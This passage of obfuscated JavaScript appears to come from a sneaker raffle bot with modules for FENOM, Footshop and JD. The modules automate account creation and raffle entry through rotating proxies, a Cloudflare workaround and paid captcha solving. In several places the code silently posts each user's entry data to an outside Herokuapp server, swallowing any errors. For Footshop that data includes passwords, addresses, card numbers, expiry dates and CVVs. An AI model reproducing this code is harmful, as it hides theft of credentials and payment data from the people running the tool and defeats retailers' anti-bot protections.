                                    'windowId': _0x36d03c,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0xfa5357(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x391006() + '\x20[' + _0x24e049['name'] + ']\x20Task\x20' + (_0x3f975a + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x516101['type']('input[name=\x22firstname\x22]', '' + _0x1b5a79[_0x3f975a]['FirstName']), await _0xfa5357(0x1f4), await _0x516101['type']('input[name=\x22lastname\x22]', '' + _0x1b5a79[_0x3f975a]['LastName']), await _0xfa5357(0x1f4), await _0x516101['type']('input[name=\x22email\x22]', '' + _0x1b5a79[_0x3f975a]['Email']), await _0xfa5357(0x1f4), await _0x516101['type']('input[name=\x22password\x22]', '' + _0x1b5a79[_0x3f975a]['Password']), await _0xfa5357(0x258), await _0x516101['$eval']('input[name=\x22psgdpr\x22]', _0x303b52 => _0x303b52['click']()), await _0xfa5357(0x1f4), console['log'](_0x391006() + '\x20[' + _0x24e049['name'] + ']\x20Task\x20' + (_0x3f975a + 0x1) + '\x20:\x20Sending\x20Request'), await _0x516101['$eval']('#customer-form', _0x10f6ea => _0x10f6ea['submit']());
                            try {
                                try {
                                    await _0x516101['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x16ec42 = 'no', console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x24e049['name'] + ']\x20Task\x20' + (_0x3f975a + 0x1) + '\x20:\x20Account\x20' + _0x1b5a79[_0x3f975a]['Email'] + '\x20Generated')), _0x13dabd['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x1b5a79[_0x3f975a]['Email'] + ',' + _0x1b5a79[_0x3f975a]['Password']);
                                let _0x3a769f = _0x1b5a79[_0x3f975a];
                                try {
                                    prxdata = {
                                        'username': _0x4ee077['replace']('#', ''),
                                        'module': _0x24e049['name'],
                                        'entrydata': JSON['stringify'](_0x3a769f),
                                        'proxy': '' + _0x457fdb[_0x3f975a]
                                    };
                                    var _0x5b1fbd = JSON['stringify'](prxdata);
                                    let _0x29275b = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x5b1fbd, _0x29275b);
                                } catch (_0x277f68) {
                                }
                                try {
                                    _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x551c4a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x33437b(_0x96b204, _0x551c4a['succesDEVMSG']);
                            } catch (_0x5cea0b) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x39cb0e) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x24e049['name'] + ']\x20Task\x20' + (_0x3f975a + 0x1) + '\x20:\x20' + _0x39cb0e)), _0x1189f5 = '' + _0x39cb0e;
                            var _0x38281e = await _0xc964cf(_0x1b5a79[_0x3f975a], _0x24e049, 'acc', !![], _0x1189f5);
                            _0x551c4a['errorDEV'] = { 'embeds': [_0x38281e] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x551c4a['errorDEV']), await _0x33437b(_0x5e1645, _0x551c4a['errorDEV']), _0x16ec42 = 'yes';
                        } finally {
                            _0x298197['close']();
                            if (_0x16ec42 == 'yes' && _0x346f35 != 0x5 && _0x1189f5 != 'Size\x20Not\x20Found') {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x24e049['name'] + ']\x20Task\x20' + (_0x3f975a + 0x1) + '\x20:\x20Retrying\x20(' + _0x346f35 + '\x20/\x205)')), _0x3f975a = _0x3f975a - 0x1, _0x346f35 = _0x346f35 + 0x1;
                                continue;
                            }
                            _0x16ec42 == 'yes' && _0x346f35 >= 0x5 && (_0x3003c7(_0x1b5a79[_0x3f975a], _0x24e049), _0x16ec42 = 'no', _0x346f35 = 0x0), console['log'](_0x391006() + '\x20[' + _0x24e049['name'] + ']\x20Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x3ccb2c(_0x5b587b, _0x4b3610, _0x55fb90) {
                    _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x50b722['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5ba265 = 0x0; _0x5ba265 < _0x4b3610['length']; _0x5ba265++) {
                        if (_0x3a602b != 'yes')
                            var _0x3a602b = '', _0x5bff70 = 0x0;
                        var _0x20c0a5;
                        try {
                            await _0x559c6d(_0x4b3610, _0x5ba265);
                        } catch {
                            _0x3a602b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3b7620(_0x5b587b['name'] + '\x20Task\x20' + (_0x5ba265 + 0x1) + '\x20/\x20' + _0x4b3610['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                        const _0x58c3ba = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x297b27 = Math['round'](Math['random']() * (_0x55fb90['length'] - 0x1)), _0x1db0c6 = _0x55fb90[_0x297b27]['split'](':'), _0x8f55f5;
                        try {
                            _0x8f55f5 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1db0c6[0x0] + ':' + _0x1db0c6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x8f55f5 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1db0c6[0x0] + ':' + _0x1db0c6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x361b49 = await _0x8f55f5['newPage'](), _0x2ed921 = await _0x361b49['target']()['createCDPSession'](), { windowId: _0xd4a295 } = await _0x2ed921['send']('Browser.getWindowForTarget');
                            await _0x361b49['authenticate']({
                                'username': '' + _0x1db0c6[0x2],
                                'password': '' + _0x1db0c6[0x3]
                            }), console['log'](_0x391006() + '\x20[' + _0x5b587b['name'] + ']\x20Task\x20' + (_0x5ba265 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x361b49['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x391006() + '\x20[' + _0x5b587b['name'] + ']\x20Task\x20' + (_0x5ba265 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xfa5357(0xbb8), await _0x2ed921['send']('Browser.setWindowBounds', {
                                'windowId': _0xd4a295,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xfa5357(0x1f40);
                            try {
                                await _0x361b49['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0xfa5357(0x1388), console['log'](_0x391006() + '\x20[' + _0x5b587b['name'] + ']\x20Task\x20' + (_0x5ba265 + 0x1) + '\x20:\x20Logging\x20in'), await _0x361b49['type']('input[name=\x22email\x22]', '' + _0x4b3610[_0x5ba265]['Email']), await _0xfa5357(0x1f4), await _0x361b49['type']('input[name=\x22password\x22]', '' + _0x4b3610[_0x5ba265]['Password']), await _0xfa5357(0x258), await _0x361b49['$eval']('#login-form', _0x30600a => _0x30600a['submit']()), await _0x361b49['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0xfa5357(0x1f4), await _0x361b49['goto']('' + _0x4b3610[_0x5ba265]['Url']), await _0x361b49['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x391006() + '\x20[' + _0x5b587b['name'] + ']\x20Task\x20' + (_0x5ba265 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4b3610[_0x5ba265]['Size']);
                            if (_0x4b3610[_0x5ba265]['Size'] != 'RANDOM') {
                                var _0x35882b = '\x20' + _0x4b3610[_0x5ba265]['Size'] + '\x20';
                                const _0x515c0c = await _0x361b49['$x']('//span[contains(text(),\x20' + _0x35882b + ')]');
                                await _0x515c0c[0x0]['click']();
                            } else {
                                const _0x13597b = await _0x361b49['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x49aca3 = Math['round'](Math['random']() * (_0x13597b['length'] - 0x1));
                                await _0x13597b[_0x49aca3]['click']();
                            }
                            await _0xfa5357(0x258), await _0x361b49['click']('#cookieChoiceDismiss'), await _0xfa5357(0x3e8), await _0x361b49['type']('#instagram-account', '' + _0x4b3610[_0x5ba265]['Follower']), await _0xfa5357(0x28a), await _0x361b49['click']('#book-btn'), await _0xfa5357(0xbb8);
                            try {
                                await _0x361b49['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0xfa5357(0x1f4), console['log'](_0x391006() + '\x20[' + _0x5b587b['name'] + ']\x20Task\x20' + (_0x5ba265 + 0x1) + '\x20:\x20' + _0x34d98c['cyan']('Solving\x20Captcha')), await _0x361b49['solveRecaptchas'](), console['log'](_0x391006() + '\x20[' + _0x5b587b['name'] + ']\x20Task\x20' + (_0x5ba265 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xfa5357(0x7d0), await _0x361b49['$eval']('#book-btn-for-sure', _0x3642c9 => _0x3642c9['click']()), await _0xfa5357(0x12c), await _0x361b49['click']('#book-btn-for-sure'), await _0xfa5357(0xdac);
                            const _0x32e3a5 = await _0x361b49['$eval']('.reservation-popup\x20>\x20.title', _0x345855 => {
                                return _0x345855['innerHTML'];
                            });
                            if (_0x32e3a5) {
                                _0x3a602b = 'no', _0x253d32(_0x4b3610[_0x5ba265], _0x5b587b), console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x5b587b['name'] + ']\x20Task\x20' + (_0x5ba265 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x10cc39 = await _0xc964cf(_0x4b3610[_0x5ba265], _0x5b587b, 'dev', ![]), _0x840fd3 = await _0xc964cf(_0x4b3610[_0x5ba265], _0x5b587b, 'pub', ![]);
                                let _0x402dcd = _0x4b3610[_0x5ba265];
                                try {
                                    prxdata = {
                                        'username': _0x4ee077['replace']('#', ''),
                                        'module': _0x5b587b['name'],
                                        'entrydata': JSON['stringify'](_0x402dcd),
                                        'proxy': '' + _0x55fb90[_0x5ba265]
                                    };
                                    var _0x5398dc = JSON['stringify'](prxdata);
                                    let _0x53b1e6 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x5398dc, _0x53b1e6);
                                } catch (_0x251138) {
                                }
                                const _0x271bd0 = {
                                    'succesDEVMSG': { 'embeds': [_0x10cc39] },
                                    'succesPUBMSG': { 'embeds': [_0x840fd3] }
                                };
                                try {
                                    _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x271bd0['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x271bd0['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0x471d14, _0x271bd0['succesPUBMSG']);
                                } catch (_0x3888fa) {
                                    console['log'](_0x34d98c['yellow'](_0x391006() + '\x20[' + _0x5b587b['name'] + ']\x20Task\x20' + (_0x5ba265 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3888fa));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x3a5ebf) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x5b587b['name'] + ']\x20Task\x20' + (_0x5ba265 + 0x1) + '\x20:\x20' + _0x3a5ebf)), _0x20c0a5 = '' + _0x3a5ebf;
                            var _0x1d4ff8 = await _0xc964cf(_0x4b3610[_0x5ba265], _0x5b587b, 'dev', !![], _0x20c0a5), _0x10cc39 = await _0xc964cf(_0x4b3610[_0x5ba265], _0x5b587b, 'dev', ![]), _0x840fd3 = await _0xc964cf(_0x4b3610[_0x5ba265], _0x5b587b, 'pub', ![]);
                            const _0x142eac = {
                                'succesDEVMSG': { 'embeds': [_0x10cc39] },
                                'succesPUBMSG': { 'embeds': [_0x840fd3] }
                            };
                            _0x142eac['errorDEV'] = { 'embeds': [_0x1d4ff8] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x142eac['errorDEV']), await _0x33437b(_0x5e1645, _0x142eac['errorDEV']), _0x3a5ebf != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x3a602b = 'yes');
                        } finally {
                            _0x8f55f5['close']();
                            if (_0x3a602b == 'yes' && _0x5bff70 != 0x5 && _0x20c0a5 != 'Size\x20Not\x20Found') {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x5b587b['name'] + ']\x20Task\x20' + (_0x5ba265 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5bff70 + '\x20/\x205)')), _0x5ba265 = _0x5ba265 - 0x1, _0x5bff70 = _0x5bff70 + 0x1;
                                continue;
                            }
                            _0x3a602b == 'yes' && _0x5bff70 >= 0x5 && (_0x3003c7(_0x4b3610[_0x5ba265], _0x5b587b), _0x3a602b = 'no', _0x5bff70 = 0x0), console['log'](_0x391006() + '\x20[' + _0x5b587b['name'] + ']\x20Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x5853ce, _0xbdac7f, _0x59198e) {
                _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x50b722['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x4bafc9 = 0x0; _0x4bafc9 < _0xbdac7f['length']; _0x4bafc9++) {
                    var _0x40d43d;
                    if (_0x16c599 != 'yes')
                        var _0x16c599 = '', _0x439a4d = 0x0;
                    var _0xb097c5 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x4ee077
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0xbdac7f[_0x4bafc9]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0xbdac7f[_0x4bafc9]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x50b722['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x1f5435
                            }
                        ]
                    }], _0x1aaf54 = await _0xc964cf(_0xbdac7f[_0x4bafc9], _0x5853ce, 'dev', ![]), _0x32f3c9 = await _0xc964cf(_0xbdac7f[_0x4bafc9], _0x5853ce, 'pub', ![]);
                    const _0x453a56 = {
                        'succesDEVMSG': { 'embeds': [_0x1aaf54] },
                        'succesPUBMSG': { 'embeds': [_0x32f3c9] }
                    }, _0x413b12 = { 'embeds': _0xb097c5 };
                    try {
                        await _0x559c6d(_0xbdac7f, _0x4bafc9);
                    } catch {
                        _0x16c599 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0xbdac7f[_0x4bafc9]['Email'] == '' || _0xbdac7f[_0x4bafc9]['FirstName'] == '' || _0xbdac7f[_0x4bafc9]['LastName'] == '' || _0xbdac7f[_0x4bafc9]['Country'] == '' || _0xbdac7f[_0x4bafc9]['Size'] == '' || _0xbdac7f[_0x4bafc9]['Address1'] == '' || _0xbdac7f[_0x4bafc9]['Zip'] == '') {
                        console['log'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0xbdac7f[_0x4bafc9]['Email'] == '' || _0xbdac7f[_0x4bafc9]['FirstName'] == '' || _0xbdac7f[_0x4bafc9]['LastName'] == '' || _0xbdac7f[_0x4bafc9]['Country'] == '' || _0xbdac7f[_0x4bafc9]['Size'] == '' || _0xbdac7f[_0x4bafc9]['Address1'] == '' || _0xbdac7f[_0x4bafc9]['Zip'] == '' || _0xbdac7f[_0x4bafc9]['Phone'] == '') {
                        console['log'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x382fcb = '' + _0xbdac7f[_0x4bafc9]['Url'];
                    if (_0x50b722['useRandomProxy'] = ![])
                        var _0x1fbb32 = _0x59198e[_0x4bafc9]['split'](':');
                    else
                        var _0x3b91b7 = Math['round'](Math['random']() * (_0x59198e['length'] - 0x1)), _0x1fbb32 = _0x59198e[_0x3b91b7]['split'](':');
                    var _0x8e6ffe;
                    try {
                        _0x8e6ffe = await _0x1528cf['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1fbb32[0x0] + ':' + _0x1fbb32[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x8e6ffe = await _0x1528cf['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1fbb32[0x0] + ':' + _0x1fbb32[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x7657f7 = await _0x8e6ffe['newPage']();
                        await _0x7657f7['authenticate']({
                            'username': '' + _0x1fbb32[0x2],
                            'password': '' + _0x1fbb32[0x3]
                        }), console['log'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x7657f7['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x7657f7['setRequestInterception'](!![]), _0x7657f7['on']('request', _0xa6544e => {
                            _0xa6544e['resourceType']() === 'image' || _0xa6544e['resourceType']() === 'font' || _0xa6544e['resourceType']() === 'media' ? _0xa6544e['abort']() : _0xa6544e['continue']();
                        });
                        try {
                            await _0x7657f7['goto'](_0x382fcb), await _0xfa5357(0xbb8), await _0x7657f7['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x7657f7['click']('.control__JhutY'), await _0xfa5357(0x1f4);
                        if (_0xbdac7f[_0x4bafc9]['Size'] != 'RANDOM')
                            try {
                                const _0x17039d = await _0x7657f7['$x']('//div[contains(text(),\x20\x27' + _0xbdac7f[_0x4bafc9]['Size'] + '\x27)]');
                                await _0x17039d[0x0]['click']();
                            } catch {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x572029 = await _0x7657f7['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x33f36f = Math['round'](Math['random']() * (_0x572029['length'] - 0x1));
                            await _0x572029[_0x33f36f]['click']();
                        }
                        await _0xfa5357(0x4b0);
                        const _0x45e040 = await _0x7657f7['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x45e040[0x0]['click'](), await _0x7657f7['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x7657f7['type']('input[name=\x22email\x22]', '' + _0xbdac7f[_0x4bafc9]['Email']), await _0xfa5357(0x640), await _0x7657f7['type']('input[name=\x22phone\x22]', '' + _0xbdac7f[_0x4bafc9]['Phone']), await _0xfa5357(0x4b0), await _0x7657f7['click']('button.btn.continue-button__1RtsS'), await _0xfa5357(0x4b0);
                        try {
                            await _0x7657f7['type']('input[name=\x22firstName\x22]', '' + _0xbdac7f[_0x4bafc9]['FirstName']), await _0xfa5357(0x258);
                        } catch {
                            const _0x30ef28 = await _0x7657f7['$$eval']('.invalid-feedback\x20>\x20div', _0x503d11 => {
                                return _0x503d11['map'](_0x5652ad => _0x5652ad['innerText']);
                            });
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20' + _0x30ef28));
                            continue;
                        }
                        await _0x7657f7['type']('input[name=\x22lastName\x22]', '' + _0xbdac7f[_0x4bafc9]['LastName']), await _0xfa5357(0xc8), await _0x7657f7['type']('input[name=\x22instagramUsername\x22]', '' + _0xbdac7f[_0x4bafc9]['Follower']), await _0xfa5357(0x4b0), await _0x7657f7['click']('button.btn.continue-button__1RtsS'), await _0xfa5357(0x3e8), console['log'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x7657f7['select']('select[name=\x22country\x22]', '' + _0xbdac7f[_0x4bafc9]['Country']), await _0xfa5357(0x2bc), await _0x7657f7['type']('input[name=\x22streetName\x22]', '' + _0xbdac7f[_0x4bafc9]['Address1']), await _0xfa5357(0x258), await _0x7657f7['type']('input[name=\x22houseNumber\x22]', _0xbdac7f[_0x4bafc9]['HouseNumber'] + '\x20' + _0xbdac7f[_0x4bafc9]['Address2']), await _0xfa5357(0xc8), await _0x7657f7['type']('input[name=\x22postalCode\x22]', '' + _0xbdac7f[_0x4bafc9]['Zip']), await _0xfa5357(0x1f4), await _0x7657f7['type']('input[name=\x22city\x22]', '' + _0xbdac7f[_0x4bafc9]['City']), await _0xfa5357(0x4b0), await _0x7657f7['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0xfa5357(0x4b0), await _0x7657f7['click']('button.btn.continue-button__1RtsS'), await _0xfa5357(0x4b0), console['log'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x7657f7['solveRecaptchas'](), console['log'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0xfa5357(0xbb8), await _0x7657f7['click']('button.btn.continue-button__1RtsS'), await _0xfa5357(0x1388), console['log'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x7657f7['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x7657f7['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xfa5357(0x4b0), await _0x7657f7['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0xbdac7f[_0x4bafc9]['CardNumber']), await _0xfa5357(0x320), await _0x7657f7['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x7657f7['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0xbdac7f[_0x4bafc9]['ExpiryDate']), await _0xfa5357(0x4b0), await _0x7657f7['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x7657f7['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0xbdac7f[_0x4bafc9]['CVV']), await _0xfa5357(0x226), await _0x7657f7['type']('input[name=\x22holderName\x22]', '' + _0xbdac7f[_0x4bafc9]['NameOnCard']), await _0xfa5357(0x226), await _0x7657f7['click']('button.adyen-checkout__button'), console['log'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x7657f7['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0xfa5357(0xbb8);
                        } catch (_0x1f43c1) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x203DS\x20Failed')), _0x40d43d = '3DS\x20Error\x20' + _0x1f43c1;
                            var _0x29a617 = await _0xc964cf(_0xbdac7f[_0x4bafc9], _0x5853ce, 'dev', !![], _0x40d43d);
                            _0x453a56['errorDEV'] = { 'embeds': [_0x29a617] };
                            _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x453a56['errorDEV']);
                            await _0x33437b(_0x5e1645, _0x453a56['errorDEV']);
                            continue;
                        }
                        _0x253d32(_0xbdac7f[_0x4bafc9], _0x5853ce), console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x1a5e78 = _0xbdac7f[_0x4bafc9];
                        try {
                            prxdata = {
                                'username': _0x4ee077['replace']('#', ''),
                                'module': _0x5853ce['name'],
                                'entrydata': JSON['stringify'](_0x1a5e78),
                                'proxy': '' + _0x59198e[_0x4bafc9]
                            };
                            var _0x3a7db1 = JSON['stringify'](prxdata);
                            let _0x1a7c96 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x3a7db1, _0x1a7c96);
                        } catch (_0x1d2154) {
                        }
                        if (_0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '')
                            try {
                                await _0x33437b(_0x50b722['webhook'], _0x453a56['succesDEVMSG']);
                            } catch {
                            }
                        await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x453a56['succesDEVMSG']), await _0xfa5357(0xc8);
                        try {
                            await _0x33437b(_0x471d14, _0x453a56['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x482cd6) {
                        console['log'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20' + _0x482cd6), _0x40d43d = '' + _0x482cd6;
                        var _0x29a617 = await _0xc964cf(_0xbdac7f[_0x4bafc9], _0x5853ce, 'dev', !![], _0x40d43d);
                        _0x453a56['errorDEV'] = { 'embeds': [_0x29a617] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x453a56['errorDEV']), await _0x33437b(_0x5e1645, _0x453a56['errorDEV']), _0x16c599 = 'yes';
                    } finally {
                        _0x8e6ffe['close']();
                        if (_0x16c599 == 'yes' && _0x439a4d != 0x5) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x5853ce['name'] + ']\x20Task\x20' + (_0x4bafc9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x439a4d + '\x20/\x205)')), _0x4bafc9 = _0x4bafc9 - 0x1, _0x439a4d = _0x439a4d + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x25daca, _0x4acff3, _0x4ea5d2) {
                var _0x47176c = ![], _0x144720 = ![];
                if (_0x50b722['captchaKey'] == '' || _0x50b722['captchaKey'] == undefined)
                    return console['log'](_0x34d98c['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x50b722['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3352dc = 0x0; _0x3352dc < _0x4acff3['length']; _0x3352dc++) {
                    if (_0x4b719c != 'yes')
                        var _0x4b719c = '', _0x11e8c6 = 0x0;
                    var _0x56a9d3, _0x5185fd = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x4acff3[_0x3352dc]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x4acff3[_0x3352dc]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x4ee077
